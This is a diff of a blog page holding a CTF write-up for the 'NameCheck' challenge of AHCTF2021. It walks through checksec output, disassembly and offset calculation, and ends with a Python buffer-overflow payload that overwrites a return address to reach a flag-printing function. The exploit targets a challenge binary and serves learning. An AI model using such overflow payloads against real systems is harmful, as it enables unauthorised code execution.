@@ -1,11 +1,43 @@
-<!doctype html><html><meta charset=utf-8><meta name=generator content="Hugo 0.154.5"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light"><meta name=supported-color-schemes content="light"><title>AHCTF2021: NameCheck&nbsp;&ndash;&nbsp;The Mess Of Nebula</title><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400;1,500;1,600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel=stylesheet><link rel=icon type=image/png sizes=32x32 href=/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/images/favicon.ico><link rel=stylesheet href=/css/core.min.365ca8fdb23faa48c9ee0b1db3e557cb91e00aa641c11d9ab3d53d928c8341f94f3cbfc24e510a5ffbed83462148dd0d.css integrity=sha384-Nlyo/bI/qkjJ7gsds+VXy5HgCqZBwR2as9U9koyDQflPPL/CTlEKX/vtg0YhSN0N><body><div class="base-body max-width"><section id=header class="header max-body-width"><div class=header-wrap><div class=header-left-side><a class=home href=/><span class=site-name>The Mess Of Nebula</span><span class=site-slogan>Gravitations towards point origin</span></a></div><div class=header-right-side><div class=nav-wrap><div class=nav><a class=site-tag href=/index>Index</a><a class=site-tag href=/about>About</a></div></div></div></div></section><div id=content class="flex-body max-body-width"><section class=article-header><h1>AHCTF2021: NameCheck</h1><p class=article-date>2022-09-18</p></section><article class=markdown-body><h4 id=for-the-birds>For the birds</h4><blockquote><p>It has been a while since I have blogged. The importance of doing so has not been absent only outweighed by the inertia(that dread to begin). This is the start of an attempt to put more of my thoughts on e-paper. I also maintain a <a href=https://t.me/+UiasApN2xtWSWPy9 target=_blank>telegram space</a> where I dump materials/resources I encounter as I go along.</p></blockquote><hr><p><a target=_blank rel="noopener noreferrer" href=/images/nm_header.png><img class=img src=/images/nm_header.png alt></a></p><hr><h3 id=checksec>Checksec</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/levanto/Documents/Return-To-ROP/ChasingFlags/AHCTF/finals/namecheck&#39;</span>
-</span></span><span class=line><span class=cl>    Arch:     i386-32-little
-</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
-</span></span><span class=line><span class=cl>    Stack:    No canary found
-</span></span><span class=line><span class=cl>    NX:       NX disabled
-</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</span></span><span class=line><span class=cl>    RWX:      Has RWX segments
-</span></span></code></pre></div><hr><h3 id=rodata>.rodata</h3><pre tabindex=0><code>Contents of section .rodata:
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AHCTF2021: NameCheck · Levanto</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;1,300&family=EB+Garamond:ital@0;1&family=IBM+Plex+Mono&family=Fraunces:ital,wght@0,300;1,300&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/style.css">
+<link rel="alternate" type="application/rss+xml" title="Levanto" href="/index.xml">
+</head>
+<body class="page-post" style="--age:0.62">
+<header class="topbar">
+  <a class="avatar" href="/" aria-label="home"><img class="face" src="/img/cat-face.webp" alt="the cat"><img class="wave" src="/img/cat-wave.webp" alt=""></a>
+  <nav><a href="/stream/">stream</a><a href="/#back">about</a></nav>
+</header>
+<article class="post">
+  <div class="post-head"><img class="print" src="/media/prints/namecheck.webp" alt="">
+    <div><span class="mono">S.17</span><h1>AHCTF2021: NameCheck</h1><p class="sub">A writeup for the NameCheck challenge from the AHCTF2021 CTF</p><span class="mono">18 Sep 2022 · write-up · return address overwrite</span></div>
+  </div>
+  <div class="post-body "><h4>For the birds</h4>
+<blockquote>
+<p>It has been a while since I have blogged. The importance of doing so has not been absent only outweighed by the inertia(that dread to begin). This is the start of an attempt to put more of my thoughts on e-paper. I also maintain a <a href="https://t.me/+UiasApN2xtWSWPy9">telegram space</a> where I dump materials/resources I encounter as I go along.</p>
+</blockquote>
+<hr />
+<p><img src="/media/posts/nm_header.webp" alt="" width="776" height="470" loading="lazy" decoding="async"></p>
+<hr />
+<h3>Checksec</h3>
+<pre><code class="language-bash">[*] '/home/levanto/Documents/Return-To-ROP/ChasingFlags/AHCTF/finals/namecheck'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<hr />
+<h3>.rodata</h3>
+<pre><code>Contents of section .rodata:
  80486d8 03000000 01000200 2f62696e 2f636174  ......../bin/cat
  80486e8 20666c61 6700456e 74657220 796f7520   flag.Enter you
  80486f8 6e616d65 3a200050 61727369 6e672074  name: .Parsing t
@@ -15,11 +47,34 @@
  8048738 20666169 6c656420 746f206d 65657420   failed to meet
  8048748 7374616e 64617264 732e2042 79653a29  standards. Bye:)
  8048758 00  
-</code></pre><ul><li>/bin/cat flag @ 0x80486e0</li></ul><p>Let&rsquo;s create a fake flag file:</p><p><code>echo "Pwn3d{1337_fake_flag}" > flag</code></p><hr><h3 id=interesting-functions-readelf---syms-namecheck>Interesting functions (<code>readelf --syms namecheck</code>)</h3><ul><li>main</li><li>parseName @ 0x0804855b</li></ul><h4 id=systemcheck--0x0804859f><code>systemCheck @ 0x0804859f</code></h4><blockquote><p>This function is not called anywhere within <code>main</code> or <code>parseName</code>.</p><p>It prints the contents of a flag file</p><p>TARGET FOUND: This is where we want to be!</p></blockquote><pre tabindex=0><code>...
+</code></pre>
+<ul>
+<li>/bin/cat flag @ 0x80486e0</li>
+</ul>
+<p>Let's create a fake flag file:</p>
+<p><code>echo "Pwn3d{1337_fake_flag}" &gt; flag</code></p>
+<hr />
+<h3>Interesting functions (<code>readelf --syms namecheck</code>)</h3>
+<ul>
+<li>main</li>
+<li>parseName @ 0x0804855b</li>
+</ul>
+<h4><code>systemCheck @ 0x0804859f</code></h4>
+<blockquote>
+<p>This function is not called anywhere within <code>main</code> or <code>parseName</code>.</p>
+<p>It prints the contents of a flag file</p>
+<p>TARGET FOUND: This is where we want to be!</p>
+</blockquote>
+<pre><code>...
 80485a8:       68 e0 86 04 08          push   0x80486e0 ; /bin/cat flag 
 80485ad:       e8 5e fe ff ff          call   8048410 &lt;system@plt&gt;
 ...
-</code></pre><h4 id=main--0x080485b8><code>main @ 0x080485b8</code></h4><blockquote><p>Takes user input of max size 0x191(401 bytes). Calls <code>parseName</code> on the input</p></blockquote><pre tabindex=0><code>...
+</code></pre>
+<h4><code>main @ 0x080485b8</code></h4>
+<blockquote>
+<p>Takes user input of max size 0x191(401 bytes). Calls <code>parseName</code> on the input</p>
+</blockquote>
+<pre><code>...
 ; Get user input --&gt; fgets(*buf=ebp-0x19c, count=0x191, fd=0)
  80485f1:       50                      push   eax
  80485f2:       68 91 01 00 00          push   0x191
@@ -37,7 +92,13 @@
  804861f:       50                      push   eax
  8048620:       e8 36 ff ff ff          call   804855b &lt;parseName&gt;
 ...
-</code></pre><h4 id=parsenamestr-input--0x0804855b><code>parseName(str input) @ 0x0804855b</code></h4><blockquote><p>This function checks the input length and does a memcpy if the condition is met(see instr @ 0x80485f2).</p><p>Note: Input is pushed to the stack before this function is called. Accessed in the local frame via (ebp+0x8)</p></blockquote><pre tabindex=0><code>0804855b &lt;parseName&gt;:
+</code></pre>
+<h4><code>parseName(str input) @ 0x0804855b</code></h4>
+<blockquote>
+<p>This function checks the input length and does a memcpy if the condition is met(see instr @ 0x80485f2).</p>
+<p>Note: Input is pushed to the stack before this function is called. Accessed in the local frame via (ebp+0x8)</p>
+</blockquote>
+<pre><code>0804855b &lt;parseName&gt;:
 ; From the sp, we calculate the return addr of parseName: 0x28(stack size) + 0x8(ebp) = 0x30
  804855b:       55                      push   ebp
  804855c:       89 e5                   mov    ebp,esp
@@ -49,14 +110,14 @@
  804856f:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
  8048572:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
  8048575:       83 c0 01                add    eax,0x1
- 
+
  ; To get to the memcpy branch; the lower bytes of the len have to be 0x14. A len of 0x114(276 bytes) would work and be within the 0x191 fgets limit(check main at 0x80485f2)
  8048578:       3c 14                   cmp    al,0x14
  804857a:       76 07                   jbe    8048583 &lt;parseName+0x28&gt;
  804857c:       b8 00 00 00 00          mov    eax,0x0
  8048581:       eb 1a                   jmp    804859d &lt;parseName+0x42&gt;
  8048583:       83 ec 04                sub    esp,0x4
- 
+
  ; Input is copied from the global stack(remember it was pushed right before we called `parseName`) to local stack at ebp-0xc.
  ; This means we get to the ret addr from the input at offset 0x30 - 0xc = 0x24(36 bytes)
  8048586:       ff 75 f4                push   DWORD PTR [ebp-0xc] 
@@ -68,13 +129,26 @@
  8048598:       b8 01 00 00 00          mov    eax,0x1
  804859d:       c9                      leave
  804859e:       c3                      ret
-</code></pre><hr><h4 id=lets-pwn>Let&rsquo;s pwn</h4><p>We want to jump to <code>systemCheck @ 0x0804859f</code>. In little endian: <code>\x9f\x85\x04\x08</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>36</span>
-</span></span><span class=line><span class=cl><span class=n>payload_size</span> <span class=o>=</span> <span class=mi>275</span> <span class=c1># This is 0x114 - 1 to account for the \n termination. 0x114 will satisfy the conditional check at 0x8048578</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mi>36</span> <span class=c1># junk to get to the ret addr</span>
-</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x9f\x85\x04\x08</span><span class=s2>&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># junk to pad to 275</span>
-</span></span><span class=line><span class=cl><span class=n>trail_pad_len</span> <span class=o>=</span> <span class=n>payload_size</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>trail_pad_len</span>
-</span></span></code></pre></div><p><a target=_blank rel="noopener noreferrer" href=/images/flag.png><img class=img src=/images/flag.png alt></a></p></article><section class=article-labels><a class="article-category li" href=/categories/reverse-engineering/><span class=hashtag>#</span>Reverse Engineering</a><a class="article-category li" href=/categories/ctf-writeups/><span class=hashtag>#</span>CTF Writeups</a><a class="article-tag li" href=/tags/return-address-overwrite/><span class=hashtag>#</span>return address overwrite</a></section><section class=article-navigation><p><a class=link href=/posts/secret/><span class=li></span>BHMEACTF22: Secret</a></p><p><a class=link href=/posts/pragmatic-programmer/><span class=li></span>A review: The Pragmatic Programmer</a></p></section></div><section id=footer class="footer max-body-width"><p>© 2026 Eva Levanto</p><p><span>Powered by </span><a href=https://gohugo.io>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/>Notepadium</a></p></section><script defer type=text/javascript src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity=sha384-e/4/LvThKH1gwzXhdbY2AsjR3rm7LHWyhIG5C0jiRfn8AN2eTN5ILeztWw0H9jmN crossorigin=anonymous>MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"}),MathJax.Hub.Config({TeX:{equationNumbers:{autoNumber:"AMS"}}})</script></div></body></html>
+
+</code></pre>
+<hr />
+<h4>Let's pwn</h4>
+<p>We want to jump to <code>systemCheck @ 0x0804859f</code>. In little endian: <code>\x9f\x85\x04\x08</code></p>
+<pre><code class="language-py">offset = 36
+payload_size = 275 # This is 0x114 - 1 to account for the \n termination. 0x114 will satisfy the conditional check at 0x8048578
+
+payload = b&quot;A&quot; * 36 # junk to get to the ret addr
+payload += b&quot;\x9f\x85\x04\x08&quot;
+
+# junk to pad to 275
+trail_pad_len = payload_size - len(payload)
+payload += b&quot;A&quot; * trail_pad_len
+</code></pre>
+<p><img src="/media/posts/flag.webp" alt="" width="1280" height="115" loading="lazy" decoding="async"></p></div>
+  <footer class="post-end"><p class="mono"><a href="/stream/?lens=ctf">one of 6 in CTF ↗</a></p><p class="mono"><a href="/posts/pragmatic-programmer/">← S.16 A review: The Pragmatic Programmer</a> &nbsp;·&nbsp; <a href="/posts/secret/">S.18 BHMEACTF22: Secret →</a></p></footer>
+</article>
+<div class="grain"></div>
+<script src="/js/common.js"></script>
+
+</body>
+</html>
